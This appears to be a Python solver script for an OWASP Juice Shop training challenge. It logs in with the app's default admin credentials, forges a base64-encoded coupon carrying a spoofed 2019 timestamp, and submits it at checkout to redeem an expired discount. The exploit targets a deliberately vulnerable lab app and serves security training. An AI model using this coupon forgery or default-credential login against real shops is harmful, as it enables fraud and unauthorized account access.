from core.base_solver import BaseSolver
from loguru import logger
import base64

class ExpiredCouponSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "manipulateClockChallenge"

    def solve(self) -> bool:
        # Tutorial: Create forged coupon with expired date timestamp
        # 1. Login
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        token = login_res.json().get("authentication", {}).get("token")
        if not token: return False
        headers = {"Authorization": f"Bearer {token}"}
        
        # 2. Get basket ID
        basket_res = self.client.get("/rest/basket/1", headers=headers)
        basket_data = basket_res.json().get("data", {})
        basket_id = basket_data.get("id")
        
        if not basket_id:
            logger.error("Failed to get basket ID")
            return False
            
        # 3. Add item to basket if empty
        self.client.post("/api/BasketItems", json={
            "ProductId": 1, 
            "BasketId": str(basket_id), 
            "quantity": 1
        }, headers=headers)
        
        # 4. Create forged coupon (Tutorial approach)
        # WMNSDY2019 coupon with timestamp Mar 08 2019
        code = "WMNSDY2019-1551999600000"
        coupon_data = base64.b64encode(code.encode()).decode()
        
        # 5. Checkout with couponData in payload (as per tutorial)
        checkout_payload = {
            "couponData": coupon_data
        }
        res = self.client.post(f"/rest/basket/{basket_id}/checkout", json=checkout_payload, headers=headers)
        
        return res.status_code == 200
